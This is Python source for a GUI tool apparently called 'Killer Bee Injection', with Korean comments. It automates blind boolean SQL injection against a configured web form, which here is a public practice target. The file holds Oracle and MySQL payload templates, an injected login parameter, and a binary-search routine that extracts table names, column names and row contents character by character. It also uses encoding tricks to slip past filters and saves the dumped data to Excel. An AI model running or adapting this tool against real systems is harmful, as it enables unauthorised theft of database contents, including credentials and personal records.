import openpyxl
from openpyxl import load_workbook
import asyncio
import aiohttp
import time
import math
import os
import json
import tkinter.messagebox as msgbox
import tkinter.ttk as ttk
import tkinter as tk
from tkinter import *
from tkinter import ttk
from pandastable import Table, TableModel, headers, data

import pandas as pd
import numpy as np

# 데이터 베이스별 페이로드

SQLI_payload = {}

Oracle_payload = {
    #테이블 관련 구문
    "GetTableCount":"(select count(*) from user_tables)",
    "GetTableNameLength":"(select length(table_name) from(select rownum as rowidx,table_name from user_tables)t where t.rowidx={0})",
    "GetTableName":"(select acii(substr(table_name,{0},1)) from(select rownum as rowidx,table_name from user_tables)t where t.rowidx={1})",
    "GetTableRowCount":"(select count(*) from {0})",
    #컬럼 관련 구문
    "GetColumnCount":"(select count(*) from user_tab_columns where table_name={0})",
    "GetColumnNameLength":"(select length(column_name) from(select rownum as rowidx,column_name from user_tab_columns where table_name={0})t where t.rowidx={1})",
    "GetColumnName":"(select ascii(substr(column_name,{0},1)) from(select rownum as rowidx,column_name from user_tab_columns where table_name={1})t where t.rowidx={2})",
    #데이터 관련 구문
    "GetDataLength":"(select length({0}) from(select rownum as rowidx,{0} from {1})t where t.rowidx={2})",
    "GetDataCharSetType":"(select vsize(substr({0},{1},1)) from(select rownum as rowidx,{0} from {2})t where t.rowidx={3})",
    "GetDataChar":"(select ascii(substr({0},{1},1)) from(select rownum as rowidx,{0} from {2})t where t.rowidx={3})",
}
Mysql_payload = {
    #테이블 관련 구문
    # base table만 검색하는 구문
    # "GetTableCount":"(select count(*) from information_schema.tables where table_type='base table')",
    "GetTableCount":"(select count(*) from information_schema.tables)",
    "GetTableNameLength":"(select LENGTH((select table_name from information_schema.tables limit {0},1)))",
    "GetTableName":"(select ascii(substr((select table_name from information_schema.tables limit {1},1),{0},1)))",
    "GetTableRowCount":"(select count(*) from information_schema.columns where table_name='{0}')",
    #컬럼 관련 구문
    "GetColumnCount":"(select count(*) from information_schema.columns where table_name='{0}')",
    "GetColumnNameLength":"LENGTH((select column_name from information_schema.columns where table_name='{0}' limit {1},1))",
    "GetColumnName":"(select ascii(substr((select column_name from information_schema.columns where table_name='{1}' limit {2},1),{0},1)))",
    #데이터 관련 구문
    "GetDataLength":"(select LENGTH((select {0} from {1} limit {2},1)))",
    #"(select LENGTH(ascii(substr(select column_name from table_name limit column_idx,1),column_item_length,1)))"
    "GetDataCharSetType":"(select LENGTH(substr(select {0} from {2} limit {3},1),{1},1))",
    "GetDataChar":"(select ascii(substr(select {0} from {2} limit {3},1),{1},1))",
}
Mssql_payload = {}

# 전역변수 선언
table_array = ""
column_array = ""
data_array = ""
data_count_array = ""

loaded = 0
rowidx = 0
speed = 0.5
index = 1
cnt = 0
xlsx = ""
p_var = 0
progress_max = 100
data_C1 = 1
data_C2 = 10

###################사용 방법#####################
#아래 주석쪽에 기입한 A, B, C, D, E 수정하여 사용하시면 됩니다#
##############################################

#A. 데이터베이스 타입 정하세요 1 = Oracle, 2 = Mysql, 3 = Mssql
database_type = 2
DATA_MAX_COUNT = 1000000

if database_type == 1:
    SQLI_payload = Oracle_payload
elif database_type == 2:
    SQLI_payload = Mysql_payload
else:
    SQLI_payload = Mssql_payload

#테이블 갯수 구하는 구문
rcount=SQLI_payload['GetTableCount'] 

#B. 참 거짓 구분자
delims="1234-5678-2300-9000"
#delims="!~!~!"

#C. 공격 URI header과 cookie, 요청 방식, 파라미터 타입 수정
method = "post" #get or post
data_types = "form" #form or json
url = "http://testphp.vulnweb.com/userinfo.php"
header_raw = """
Host: testphp.vulnweb.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://testphp.vulnweb.com/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
"""

cookie_raw = """
aa=aa;
"""

header = {
    line.split(": ")[0]: ": ".join(line.split(": ")[1:])
    for line in header_raw.strip().split("\n")
    if line
}

cookie = {
    line.split("=")[0]: line.split("=")[1]
    for line in cookie_raw.strip().split("; ")
    if line
}

async def bruteforce_get_form(client,target_url,params):
    async with client.get(target_url, headers=header, cookies=cookie, params=params) as resp:
        return await resp.text()

async def bruteforce_get_json(client,target_url,params):
    async with client.get(target_url+"?query="+json.dumps(params), headers=header, cookies=cookie) as resp:
        return await resp.text()

async def bruteforce_post_form(client,target_url,params):
    async with client.post(target_url, headers=header, cookies=cookie, data=params) as resp:
        return await resp.text()

async def bruteforce_post_json(client,target_url,params):
    async with client.post(target_url, headers=header, cookies=cookie, json=params) as resp:
        return await resp.text()

async def request_t(query, params, bruteforce):
    async with aiohttp.ClientSession() as client:
        response = await bruteforce(client, query, params)
        #print(response) #for response test
        if(str(response).find(e_delim.get()) > 0):
            return 1
        else:
            return 0

async def BinarySearch(min,max,query,cnt,rowidx,bruteforce=None):
    mid=math.floor((min+max)/2)

    if bruteforce == None:
        if method == "get":
            if data_types == "form":
                bruteforce = bruteforce_get_form
            else:
                bruteforce = bruteforce_get_json
        elif method == "post":
            if data_types == "form":
                bruteforce = bruteforce_post_form
                print("post form")
            else:
                bruteforce = bruteforce_post_json

    #D. 파라미터 값 수정
    params = {
        "uname":"admin",
        "pass": f"' or ({query}) between {mid+1} and {max}--'"
    }
    #C. get 방식 sql인젝션 공격 구문 틀
    bResult = await request_t(url, params, bruteforce)

    if (max-min)<=1:
        if bResult:
            return max
        else:
            return min
          
    await GetUpdateProgress(cnt, rowidx)
    time.sleep(speed)
    if bResult:
        return await BinarySearch(mid,max,query,cnt,rowidx,bruteforce)
    else:
        return await BinarySearch(min,mid,query,cnt,rowidx,bruteforce)

def ConfigureProgress(max, min):
    progressbar2['value']=0
    lbl_now.configure(text='')
    global p_var
    p_var = min
    global progress_max
    progress_max = max
    progressbar2.configure(maximum=max)
    progressbar2.step(min)

async def GetUpdateProgress(cnt, rowidx):
    global p_var

    p_var=p_var+1
    lbl_now.configure(text=str(cnt)+" / "+str(rowidx)+"( "+str(round(p_var/progress_max*100))+"% )")
    progressbar2.step()
    progressbar2.update() # ui 업데이트
    
def InjectionStop():
    global loop
    loop.stop()
    lbl_now.configure(text="작업 중지됨")
    ConfigureProgress(1, 0)
    InableSetting()
    
def Logging(text):
    log_txt.configure(state="normal")
    log_txt.insert(END, time.strftime('[ %D ] %I:%M:%S')+" >> "+str(text)+"\n")
    log_txt.configure(state="disable")
    log_txt.see(END)  

def TableRedraw():
    df = pd.DataFrame({
    '테이블 이름': table_array,
    '컬럼 수집': column_array,
    '데이터 수집': data_array,
    '데이터 갯수': data_count_array,
    })  
    
    table_sheet.updateModel(TableModel(df))
    table_sheet.redraw()

def TableWrite(text, rowidx, flag=0):
    global loaded
    table_sheet.movetoSelection(rowidx-1, 0)
    if flag == 1:
        table_array[rowidx-1] = str(text)
        loaded = 0
    else:
        table_array[rowidx-1] = table_array[rowidx-1] + str(text)
    
    TableRedraw()
    
def LoadTable():
    global cnt
    global index, table_array, column_array, data_array, data_count_array
    
    load_wb = load_workbook("project/"+e_name.get()+"/Table.xlsx", data_only=True)
    load_ws = load_wb['Sheet']
    
    cnt = int(load_ws.cell(1,3).value)
    table_array = ["" for i in range(cnt)]
    column_array = ["" for i in range(cnt)]
    data_array = ["" for i in range(cnt)]
    data_count_array = ["" for i in range(cnt)]
    
    table_sheet.addRows(cnt+10)

    times = 0
    for times in range(2,cnt+2):
        tmp = load_ws.cell(times,1).value
        if not tmp:
            break
            
            
    for w in range(2, times):
        table_array[w-2] = str(load_ws.cell(w,1).value)
        data_count_array[w-2] = str(load_ws.cell(w,7).value)

          
          
    if load_ws.cell(times,1).value:
        table_array[cnt-1] = str(load_ws.cell(cnt+1,1).value)
        data_count_array[cnt-1] = str(load_ws.cell(cnt+1,7).value)
        
        for z in range(0, cnt):
            try:
                if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+".xlsx"):
                    column_array[z] = "X"
                    if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+"_data.xlsx"):
                        data_array[z] = "X"
                    else:
                        data_array[z] = "O"
                else:
                    column_array[z] = "O"
                    if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+"_data.xlsx"):
                        data_array[z] = "X"
                    else:
                        data_array[z] = "O"
            except OSError:
                print("")
        
        df = pd.DataFrame({
            '테이블 이름': table_array,
            '컬럼 수집': column_array,
            '데이터 수집': data_array,
            '데이터 갯수': data_count_array,
        })    
    
        table_sheet.updateModel(TableModel(df))
        table_sheet.redraw()
        return -1
        #TableWrite(str(cnt)+". "+load_ws.cell(cnt+1,1).value+"\n")
        
    for z in range(0, times-2):
        try:
            if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+".xlsx"):
                column_array[z] = "X"
                if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+"_data.xlsx"):
                    data_array[z] = "X"
                else:
                    data_array[z] = "O"
            else:
                column_array[z] = "O"
                if not os.path.exists("project/"+e_name.get()+"/"+table_array[z]+"_data.xlsx"):
                    data_array[z] = "X"
                else:
                    data_array[z] = "O"
        except OSError:
            print("")
        
    df = pd.DataFrame({
    '테이블 이름': table_array,
    '컬럼 수집': column_array,
    '데이터 수집': data_array,
    '데이터 갯수': data_count_array,
    })    
    
    table_sheet.updateModel(TableModel(df))
    table_sheet.autoResizeColumns()
    table_sheet.redraw()
    
    
    index = times-1
    return load_wb
    
def DisableSetting():
    e_name.configure(state="disable")
    e_url.configure(state="disable")
    e_delim.configure(state="disable")
    e_count.configure(state="disable")
    e_speed.configure(state="disable")
    
def InableSetting():
    e_name.configure(state="normal")
    e_url.configure(state="normal")
    e_delim.configure(state="normal")
    e_count.configure(state="normal")
    e_speed.configure(state="normal")
    
def AppendSetting():
    global url, delims, rcount, speed
    url = e_url.get()
    delims = e_delim.get()
    rcount = e_count.get()
    speed = float(e_speed.get())
    
def AddTableToJob(event):
    rowclicked = table_sheet.get_row_clicked(event)
    colclicked = table_sheet.get_col_clicked(event)
    table_sheet.setSelectedRow(rowclicked)
    table_sheet.setSelectedCol(colclicked)
    table_sheet.drawSelectedRow()
    table_sheet.drawSelectedRect(rowclicked, colclicked)
    table_sheet.redraw()
    name = table_sheet.model.getValueAt(rowclicked, colclicked)
    if name != "" and name != "O":
        if name == "X":
            if colclicked == 1:
                work_txt.insert(END, table_sheet.model.getValueAt(rowclicked, 0)+":컬럼")
                Logging("[ 알림 ]"+table_sheet.model.getValueAt(rowclicked, 0)+"의 컬럼 수집을 작업에 추가했습니다.")
            else:
                work_txt.insert(END, table_sheet.model.getValueAt(rowclicked, 0)+":데이터")
                Logging("[ 알림 ]"+table_sheet.model.getValueAt(rowclicked, 0)+"의 데이터 수집을 작업에 추가했습니다.")
        else:
            if table_sheet.model.getValueAt(rowclicked, 1) == "O" and table_sheet.model.getValueAt(rowclicked, 2) == "O":
                Logging("[ 알림 ]데이터 와 컬럼을 불러옵니다")
                ColumnToTable(table_sheet.model.getValueAt(rowclicked, colclicked)+"_data")
            elif table_sheet.model.getValueAt(rowclicked, 1) == "O":
                Logging("[ 알림 ]컬럼을 불러옵니다")
                ColumnToTable(table_sheet.model.getValueAt(rowclicked, colclicked))
            else:
                Logging("[ 오류 ]불러 올 값이 없습니다 인젝션을 진행해 주십시오.")
    
def ColumnToTable(names):
    filename = "project/"+e_name.get()+"/"+names+".xlsx"
    
    if filename == None:
        filename = filedialog.askopenfilename(parent=self.master,
                                                          defaultextension='.xls',
                                                          initialdir=os.getcwd(),
                                                          filetypes=[("xls","*.xls"),
                                                                     ("xlsx","*.xlsx"),
                                                            ("All files","*.*")])
    if not filename:
        return

    xl = pd.ExcelFile(filename)
    names = xl.sheet_names

    df = xl.parse("Sheet")
    model = TableModel(dataframe=df)
    data_sheet.updateModel(model)
    data_sheet.redraw()
    
def Test():
    wb = load_workbook("project/"+e_name.get()+"/test.xlsx")
    sheet = wb['Sheet']
    xlsx = "project/"+e_name.get()+"/test.xlsx"
    sheet.cell(2, 1).value = "안녕?"
    wb.save(xlsx)
    
def WorkStart():
    name_index = work_txt.get(0, work_txt.size())
    
    for i in name_index:
        tmp = i.split(":")
        if tmp[1] == "컬럼":
            ColumnInjection(tmp[0])
            work_txt.delete(0)
        else:
            DataInjection(tmp[0])
            work_txt.delete(0)

def WorkDelete():
    work_txt.delete(work_txt.curselection())

def WorkTop():
    name_index = work_txt.get(work_txt.curselection())
    work_txt.delete(work_txt.curselection())
    work_txt.insert(0, name_index)

def WorkUp():
    i = work_txt.curselection()
    if i != 0:
        name_index = work_txt.get(i)
        work_txt.delete(work_txt.curselection())
        work_txt.insert(i[0]-1, name_index)
    else:
        return

def WorkDown():
    i = work_txt.curselection()
    name_index = work_txt.get(i)
    work_txt.delete(work_txt.curselection())
    work_txt.insert(i[0]+1, name_index)  

def WorkReset():
    work_txt.delete(0,'end')

def AddAllData():
    for i in range(0, len(table_array)):
        if data_array[i] == "X":
            work_txt.insert(END, table_array[i]+":데이터")
    
    Logging("[ 알림 ]모든 데이터를 수집 작업에 추가했습니다.")

def AddAllColumn():
    for i in range(0, len(table_array)):
        if column_array[i] == "X":
            work_txt.insert(END, table_array[i]+":컬럼")
    
    Logging("[ 알림 ]모든 컬럼을 수집 작업에 추가했습니다.")

def ColumnAllInjection():
    AddAllColumn()
    WorkStart()

def DataInjection(column_name,index=1,index2=0):  
    cur_selected = 0
    rowidx = 1
    try:
        #DisableSetting()
        AppendSetting()
        if index == 1:
            #설정 탭에 있는 데이터 범위1 값 가져오기
            index = int(e_data_count1.get())
            #설정 탭에 있는 데이터 범위2 값 가져오기
            data_count = int(e_data_count2.get())
            
            load_wb = load_workbook("project/"+e_name.get()+"/"+column_name+".xlsx", data_only=True)
            load_ws = load_wb['Sheet']
            column_count = int(load_ws.cell(1,1).value)
            
            now_word = ""
            cname = []
            if index == 1:
                wb = openpyxl.Workbook()
                sheet = wb.active
            else:
                wb = load_workbook("project/"+e_name.get()+"/"+column_name+"_data.xlsx", data_only=True)
                sheet = wb['Sheet']
                
            xlsx = "project/"+e_name.get()+"/"+column_name+"_data.xlsx"
            for i in range(2, column_count+2):
                now_val = load_ws.cell(i,1).value
                if now_val != None:
                    cname.append(now_val)
                    sheet.cell(1, i-1).value = str(now_val)
                    wb.save(xlsx)
                else:
                    Logging("[ 경고 ]"+column_name+"테이블의 컬럼 정보가 충분하지 않습니다 컬럼 인젝션을 먼저 진행해주십시오.")
                    return
        else:
            wb = load_workbook("project/"+e_name.get()+"/"+column_name+"_data.xlsx")
            sheet = wb['Sheet']
            xlsx = "project/"+e_name.get()+"/"+column_name+"_data.xlsx"
        #다음과 같이 들어감 cname=['ID','PASSWORD','USER_NAME','USER_RSN_NO','ORGAN_CODE','ORGAN_SI','ORGAN_GU']
        LoadTable()
        for rowidx in range(index,data_count+1):
            for item in cname:
                if index2 > 0:
                    index2 = index2 - 1
                    continue
                ConfigureProgress(6, 0)
                cur_selected = cname.index(item)
                data_sheet.setSelectedRow(rowidx-1)
                data_sheet.setSelectedCol(cur_selected)
                data_sheet.drawSelectedRow()
                data_sheet.drawSelectedRect(rowidx-1, cur_selected)
                data_sheet.redraw()
                #데이터의 길이 구하는 구문
                #length_query="(select+length("+item+")+from(select+rownum+as+rowidx,"+item+"+from+"+column_name+")t+where+t.rowidx="+str(rowidx)+")"
                length_query=SQLI_payload['GetDataLength'].format(item, column_name, rowidx)
                length=loop.run_until_complete(BinarySearch(0,64,length_query,data_count,rowidx))+1
                Logging("[ 성공 ]"+item+"컬럼의 "+str(rowidx)+"번째 데이터의 길이는 "+str(length-1)+" 입니다.")

                for pnum in range(1,length):
                    ConfigureProgress(2, 0)
                    #type(ASCII, EUC-KR, UTF-8)을 구하는 구문
                    query="(select+vsi%2500ze(sub%2500str("+item+","+str(pnum)+",1))+from(select+row%2500num+a%2500s+row%2500idx,"+item+"+from+"+column_name+")t+whe%2500re+t.row%2500idx="+str(rowidx)+")"
                    query=SQLI_payload['GetDataCharSetType'].format(item, pnum, column_name, rowidx)
                    tmpChr=loop.run_until_complete(BinarySearch(1,3,query,data_count,rowidx))
                    #column_name테이블의 컬럼 item의 pnum번째 데이터를 가져오는 구문
                    #query="(select+a%2500sc%2500ii(sub%2500str("+item+","+str(pnum)+",1))+from(select+row%2500num+a%2500s+row%2500idx,"+item+"+from+"+column_name+")t+whe%2500re+t.row%2500idx="+str(rowidx)+")"
                    query=SQLI_payload['GetDataChar'].format(item, pnum, column_name, rowidx)
                    if tmpChr == 1:
                        Logging("[ 알람 ]"+str(pnum)+"번째 값은 ASCII입니다.")
                        ConfigureProgress(7, 0)
                        tmpChr=loop.run_until_complete(BinarySearch(0,128,query,data_count,rowidx))
                        now_word = now_word + chr(tmpChr)
                    elif tmpChr == 2:
                        Logging("[ 알람 ]"+str(pnum)+"번째 값은 EUC-KR입니다.")
                        ConfigureProgress(13, 0)
                        tmpChr=loop.run_until_complete(BinarySearch(45217,51454,query,data_count,rowidx))
                        now_word = now_word + bytes.fromhex(hex(tmpChr)[2:]).decode('euc-kr')
                    else:
                        Logging("[ 알람 ]"+str(pnum)+"번째 값은 UTF-8입니다.")
                        ConfigureProgress(18, 0)
                        tmpChr=loop.run_until_complete(BinarySearch(15380608,15572644,query,data_count,rowidx))
                        now_word = now_word + bytes.fromhex(hex(tmpChr)[2:]).decode('utf-8')
                    if str(now_word) != "":
                        sheet.cell(rowidx+1, cur_selected+1).value = str(now_word)
                        wb.save(xlsx)
                        ColumnToTable(column_name+"_data")
                Logging("[ 성공 ]"+item+"컬럼의 "+str(rowidx)+"번째 데이터는 "+now_word+" 입니다.")
                now_word = ""
        Logging("[ 알람 ]"+str(data_count-1)+"개의 데이터를 불러왔습니다.")
        ConfigureProgress(1, 0)
        LoadTable() 
        InableSetting()
    except OSError:
        Logging("[ 오류 ]데이터 인젝션중 오류가 발생하여 재시도 합니다.")
        DataInjection(column_name,rowidx,cur_selected)
    
def ColumnInjection(column_name, index=1):
    try:
        #DisableSetting()
        AppendSetting()
        
        now_word = ""
        if index == 1:
            wb = openpyxl.Workbook()
            sheet = wb.active
            xlsx = "project/"+e_name.get()+"/"+column_name+".xlsx"
        else:
            wb = load_workbook("project/"+e_name.get()+"/"+column_name+".xlsx")
            sheet = wb['Sheet']
            xlsx = "project/"+e_name.get()+"/"+column_name+".xlsx"
        detour = column_name
        #print(column_name)
        detour = ""
        
        #column_name을 chr(76)||chr(87)||... 형식으로 변환해주는 구문
        for i in range(0,len(column_name)):
            if i != len(column_name)-1:
                detour = detour+"c%2500hr("+str(ord(column_name[i]))+")||"
            else:
                detour = detour+"c%2500hr("+str(ord(column_name[i]))+")"
        
        lbl_now.configure(text="컬럼 갯수..")
        ConfigureProgress(10, 0)
        
        #해당 테이블의 컬럼 갯수를 구하는 구문
        rcount=SQLI_payload['GetColumnCount'].format(detour)
        
        Logging("[ 알림 ]컬럼 갯수를 구합니다.")
        cnt = loop.run_until_complete(BinarySearch(0,1024,rcount,0,0))
        sheet.cell(row=1, column=1).value = str(cnt)
        wb.save(xlsx)
        Logging("[ 성공 ]컬럼 갯수는 "+str(cnt)+"개 입니다.")
        Logging(str(index)+"번째 컬럼의 길이를 구합니다.")
        ConfigureProgress(6, 0)
        
        for rowidx in range(index,cnt+1):
            #컬럼 길이를 구하는 구문
            #length_query="(select+leng%2500th(col%2500umn_na%2500me)+from(select+row%2500num+a%2500s+row%2500idx,col%2500umn_na%2500me+from+us%2500er_ta%2500b_col%2500umns+whe%2500re+tab%2500le_na%2500me="+detour+")t+whe%2500re+t.row%2500idx="+str(rowidx)+")"
            length_query=SQLI_payload["GetColumnNameLength"].format(detour, rowidx)
            length=loop.run_until_complete(BinarySearch(0,64,length_query,cnt,rowidx))+1
            Logging("[ 성공 ]"+str(rowidx)+"번째 컬럼의 길이는 "+str(length-1)+" 입니다.")
            ConfigureProgress(length*7, 0)
            Logging(str(rowidx)+"번째 컬럼의 이름을 구합니다.")
            for pnum in range(1,length):
                #detour테이블의 rowidx번째 컬럼의 pnum번째 값을 구하는 구문
                #query="(select+a%2500sc%2500ii(sub%2500str(col%2500umn_na%2500me,"+str(pnum)+",1))+from(sel%2500ect+row%2500num+a%2500s+row%2500idx,col%2500umn_na%2500me+from+us%2500er_ta%2500b_colu%2500mns+whe%2500re+tab%2500le_na%2500me="+detour+")t+whe%2500re+t.row%2500idx="+str(rowidx)+")"
                query=SQLI_payload['GetColumnName'].format(pnum, detour, rowidx)
                tmpChr=loop.run_until_complete(BinarySearch(0,128,query,cnt,rowidx))
                now_word = now_word + chr(tmpChr)
            Logging("[ 성공 ]"+str(rowidx)+"번째 컬럼은 "+now_word+" 입니다.")
            sheet.cell(rowidx+1, column=1).value = str(now_word)
            wb.save(xlsx)
            now_word = ""
            Logging(str(rowidx+1)+"번째 컬럼의 길이를 구합니다.")
            ConfigureProgress(6, 0)
        Logging("[ 알람 ]모든 컬럼을 불러왔습니다.")
        ConfigureProgress(1, 0)
        LoadTable() 
        InableSetting()
    except OSError:
        Logging("[ 오류 ]컬럼 인젝션중 오류가 발생하여 재시도 합니다.")
        ColumnInjection(column_name, rowidx)
    
    
def InjectionStart():
    #DisableSetting()
    AppendSetting()
    
    global loop
    global cnt
    global index, rowidx, loaded

    
    loaded = 0
    loop = asyncio.get_event_loop()
    
    try:
        if not os.path.exists("project/"+e_name.get()):
            os.makedirs("project/"+e_name.get())
            Logging("[ 알림 ]폴더가 없으므로 생성 합니다.")
        else:
            Logging("[ 알림 ]폴더가 존재 합니다.")
            callback = msgbox.askyesnocancel(title="불러오기", message="기존의 작업 영역이 존재 합니다.\n이어서 작업을 진행 하시겠습니까?")
            if callback == 1: # 네, ok
                Logging("[ 알람 ]기존의 작업 영역을 불러옵니다.")
                wb = LoadTable()
                if(index != 1):
                    index = index - 1
                if wb == -1:
                    Logging("[ 알람 ]모든 테이블을 불러왔습니다.")
                    return 0
                
                sheet = wb['Sheet']
                loaded = 1
                
            elif callback == 0: # 아니오
                Logging("[ 경고 ]작업 영억을 새로 시작합니다.")
            else:
                InableSetting()
                return 0
    except OSError:
        Logging("[ 경고 ]디렉토리를 생성할 수 없습니다. {}".format(e_name.get()))

    xlsx = "project/"+e_name.get()+"/Table.xlsx"
    if loaded == 0:
        wb = openpyxl.Workbook()
        sheet = wb.active
    
        lbl_now.configure(text="테이블 갯수..")
        ConfigureProgress(10, 0)
        
        #rcount(테이블 갯수 구하는 공식)을 통해 테이블 갯수를 구함
        cnt = int(loop.run_until_complete(BinarySearch(1,4096,rcount,0,0)))
        sheet.cell(row=1, column=1).value = "Table 갯수 : "
        sheet.cell(row=1, column=3).value = str(cnt)
        wb.save(xlsx)
        wb = LoadTable()
        Logging("[ 성공 ]테이블 갯수는 "+str(cnt)+"개 입니다.")
    else:
        Logging("[ 성공 ]테이블 갯수는 "+str(cnt)+"개 입니다.")
 
    Logging(str(index)+"번째 테이블의 길이를 구합니다.")
    ConfigureProgress(6, 0)
    now_word = ""
    
    for rowidx in range(index,cnt+1):
        #rowidx번째 테이블의 길이를 구하는 구문
        #length_query="(select+length(table_na%2500me)+from(select+row%2500num+as+rowidx,table_na%2500me+from+user_tables)t+where+t.rowidx="+str(rowidx)+")"
        length_query=SQLI_payload["GetTableNameLength"].format(rowidx)
        length=loop.run_until_complete(BinarySearch(1,64,length_query,cnt,rowidx))+1
        Logging("[ 성공 ]"+str(rowidx)+"번째 테이블의 길이는 "+str(length-1)+" 입니다.")
        ConfigureProgress(length*7, 0)
        Logging(str(rowidx)+"번째 테이블의 이름을 구합니다.")
        for pnum in range(1,length):
            #rowidx번째 테이블의 pnum번째 값을 구하는 구문
            #query="(select+acii(substr(table_name,"+str(pnum)+",1))+from(select+rownum+as+rowidx,table_name+from+user_tables)t+where+t.rowidx="+str(rowidx)+")"
            query=SQLI_payload["GetTableName"].format(pnum, rowidx)
            tmpChr=loop.run_until_complete(BinarySearch(1,128,query,cnt,rowidx))
            now_word = now_word + chr(tmpChr)
            TableWrite(chr(tmpChr), rowidx, loaded)
        sheet.cell(row=rowidx+1, column=1).value = str(now_word)
        wb.save(xlsx)
        
        #query="(select+co%2500unt(*)+from+"+now_word+")"
        query=SQLI_payload["GetTableRowCount"].format(now_word)
        Logging(str(index)+"번째 테이블의 데이터 갯수를 구합니다.")
        ConfigureProgress(20, 0)
        dataC=loop.run_until_complete(BinarySearch(0,DATA_MAX_COUNT,query,cnt,rowidx))   
        Logging("[ 성공 ]"+str(rowidx)+"번째 테이블의 데이터 갯수는 "+str(dataC)+" 입니다.")  
        data_count_array[rowidx-1] = dataC
        TableRedraw()
        sheet.cell(row=rowidx+1, column=7).value = str(dataC)
        wb.save(xlsx)
        
        now_word = ""
        Logging(str(rowidx+1)+"번째 테이블의 길이를 구합니다.")
        ConfigureProgress(6, 0)
    Logging("[ 알람 ]모든 테이블을 불러왔습니다.")
    ConfigureProgress(1, 0)
    LoadTable()
    InableSetting()
    
if __name__ == '__main__':
 
#############################################################
#메인 프레임 화면                                               #
#############################################################
    root = Tk()
    
    s = ttk.Style(root)
    s.layout("LabeledProgressbar",
         [('LabeledProgressbar.trough',
           {'children': [('LabeledProgressbar.pbar',
                          {'side': 'left', 'sticky': 'ns'}),
                         ("LabeledProgressbar.label",   # label inside the bar
                          {"sticky": ""})],
           'sticky': 'nswe'})])
    
    root.title("Killer Bee Injection -Made By Y0uS-")
    root.option_add("*tearOff", False) # This is always a good idea
    
    root.columnconfigure(index=0, weight=1)
    root.columnconfigure(index=1, weight=1)
    root.columnconfigure(index=2, weight=1)
    root.rowconfigure(index=0, weight=1)
    root.rowconfigure(index=1, weight=1)
    root.rowconfigure(index=2, weight=1)
    
    # Create a style
    style = ttk.Style(root)

    # Import the tcl file
    root.tk.call("source", "azure-dark.tcl")

    # Set the theme with the theme_use method
    style.theme_use("azure-dark")
    
    root.geometry("1280x720+100+100") # 가로 * 세로
    #root.geometry("640x480+300+100") # 가로 * 세로 + x좌표 + y좌표

    #root.resizable(False, False) # x(너비), y(높이) 값 변경 불가 (창 크기 변경 불가)

    #프레임1
    pin_frame1 = Frame(root, width=640, bd=2)
    pin_frame1.pack(side="left", fill="both", expand=True)

    menu = Menu(root)

    # File 메뉴
    menu_file = tk.Menu(menu, tearoff=0)
    menu_file.add_command(label="새 설정", command=Test)
    menu_file.add_command(label="설정 불러오기...")
    menu_file.add_separator()
    menu_file.add_command(label="자동으로 불러오기")
    menu_file.add_separator()
    menu_file.add_command(label="설정 저장", state="disable") # 비활성화
    menu_file.add_separator()
    menu_file.add_command(label="끝내기", command=root.quit)
    menu.add_cascade(label="File", menu=menu_file)

    # Injection 메뉴 (빈 값)
    menu_injection = Menu(menu, tearoff=0)
    menu_injection.add_command(label="테이블 인젝션 시작", command=InjectionStart)
    menu_injection.add_command(label="테이블 인젝션 정지", command=InjectionStop)
    menu_injection.add_separator()
    menu_injection.add_command(label="컬럼 인젝션 시작", command=ColumnAllInjection)
    menu_injection.add_command(label="컬럼 인젝션 정지", command=InjectionStop)
    menu_injection.add_separator()
    menu_injection.add_command(label="데이터 인젝션 시작", command=DataInjection)
    menu_injection.add_command(label="데이터 인젝션 정지", command=InjectionStop)
    menu.add_cascade(label="Injection", menu=menu_injection)
    


    # Action 메뉴
    menu_action = Menu(menu, tearoff=0)
    menu_action.add_command(label="모든 컬럼 작업에 추가", command=AddAllColumn)
    menu_action.add_command(label="모든 데이터 작업에 추가", command=AddAllData)
    menu_action.add_separator()
    menu.add_cascade(label="Action", menu=menu_action)

    root.config(menu=menu)


    #############################################################
    #진행 상황                                                    #
    #############################################################

    progress_frame = ttk.LabelFrame(pin_frame1, text="진행 현황")
    progress_frame.pack(fill="x", padx=5, pady=0, ipady=5)

    
    p_var2 = DoubleVar()
    
    progressbar2 = ttk.Progressbar(progress_frame, maximum=10, length=450, variable=p_var2)
    progressbar2.pack(side="left", padx=5, pady=3)


    lbl_now = Label(progress_frame, text="0/0( 0% )")
    lbl_now.pack(side="left", padx=5, pady=3)
    
    #############################################################
    #데이터 창                                                    #
    #############################################################
    
    D_frame = ttk.LabelFrame(pin_frame1, text="데이터 창", width=640)
    D_frame.pack(fill="both", padx=5, pady=0, ipady=5)

    #############################################################



    table_frame = Frame(D_frame, width=640, bd=2)
    table_frame.pack(side="left", fill="both", expand=True)
    
    df = pd.DataFrame({
    '테이블 이름': ["",],
    '컬럼 수집': ["",],
    '데이터 수집': ["",],
    '데이터 갯수': ["",],
    }) 
    
    table_sheet = Table(table_frame, dataframe=df,  width=340)
    
    table_sheet.show()
    
    table_sheet.setRowHeight(25)
    table_sheet.resizeColumn(0, 335)
    table_sheet.resizeColumn(1, 100)
    table_sheet.resizeColumn(2, 105)
    table_sheet.resizeColumn(3, 105)

    
    table_sheet.bind("<Button-2>", AddTableToJob)
    
    #############################################################
    
    data_frame = Frame(pin_frame1, width=640, bd=2)
    data_frame.pack(side="bottom", expand=True)
    
    data_sheet = Table(data_frame, width=531)
    data_sheet.show()
    data_sheet.setRowHeight(25)
    
    #############################################################
    #프레임 2                                                     #
    #############################################################
    
    pin_frame2 = Frame(root, width=640, bd=2)
    pin_frame2.pack(side="right", fill="both", expand=True)
    
    #############################################################
    #로그 창                                                      #
    #############################################################
    
    log_frame = ttk.LabelFrame(pin_frame2, text="콘솔창", width=640)
    log_frame.pack(fill="both", padx=5, pady=0, ipady=5)

    
    log_scroll = ttk.Scrollbar(log_frame)
